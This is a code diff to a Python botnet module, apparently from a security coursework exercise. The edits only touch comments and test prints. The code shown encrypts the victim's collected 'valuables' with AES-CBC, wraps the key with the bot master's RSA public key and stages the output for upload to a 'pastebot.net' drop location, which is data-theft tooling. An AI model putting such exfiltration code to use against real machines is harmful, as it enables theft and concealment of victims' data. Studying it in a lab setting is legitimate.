@@ -14,6 +14,7 @@ valuables = []
 
 ###
 
+# Uses padding method from tutorial code example
 def ANSI_X923_pad(m, pad_length):
     # Work out how many bytes need to be added
     required_padding = pad_length - (len(m) % pad_length)
@@ -31,17 +32,14 @@ def save_valuable(data):
 def encrypt_for_master(data, fn):
     # Encrypt the file so it can only be read by the bot master
 
-    # Generate key and IV for AES encryption with 256bits key size
-    aes_encryption_key = Random.get_random_bytes(16)  # Generate 128bit key
+    # Generate key and IV for AES encryption for data with 128 bits key size
+    aes_encryption_key = Random.get_random_bytes(16)
     iv = Random.get_random_bytes(AES.block_size)
     cipher = AES.new(aes_encryption_key, AES.MODE_CBC, iv)
 
+    # Padding is required since AES-CBC mode is chosen
     padded_data = ANSI_X923_pad(bytes(str(data), 'ascii'), AES.block_size)
     encrypted_data = cipher.encrypt(padded_data)
-
-    # print(data)  # Test print. TO BE REMOVE
-    # print(aes_encryption_key)  # Test print. TO BE REMOVE
-    # print(encrypted_data)  # Test print. TO BE REMOVE
 
     # Obtain public key from text file for encrypting aes encryption key
     pub_key = open("mypublickey.txt", "r").read()
@@ -49,6 +47,7 @@ def encrypt_for_master(data, fn):
     encrypt_aes_key = rsa_encryption_key.encrypt(aes_encryption_key, 16)  # Encrypting aes key
     print(encrypt_aes_key)
 
+    # Store the aes encryption key
     aes_key_file = os.path.join("pastebot.net", fn + ".AES.key")
     out = open(aes_key_file, "wb")
     out.write(encrypt_aes_key[0])
@@ -57,8 +56,6 @@ def encrypt_for_master(data, fn):
     print("Exported AES key!")
 
     return encrypted_data + iv
-
-# encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
